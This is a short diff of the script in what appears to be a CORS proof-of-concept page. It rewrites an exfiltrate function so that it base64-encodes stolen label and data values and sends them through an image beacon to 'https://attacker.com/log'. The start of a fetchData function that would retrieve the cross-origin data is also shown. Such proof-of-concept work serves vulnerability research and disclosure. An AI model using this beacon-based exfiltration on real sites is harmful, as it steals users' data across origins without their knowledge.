@@ -73,9 +73,10 @@ pre{
 <script>
 
 function exfiltrate(label, data){
-  new Image().src = "tohamisamrael.github.io/oppo-cors-poc.html/?d=" + btoa(label + ":" + data);
+  const encoded = btoa(unescape(encodeURIComponent(label + ":" + data)));
+  new Image().src = "https://attacker.com/log?d=" + encoded;
 }
-
+  
 function fetchData(url, elementId, label){
   fetch(url, {
     method: "GET",
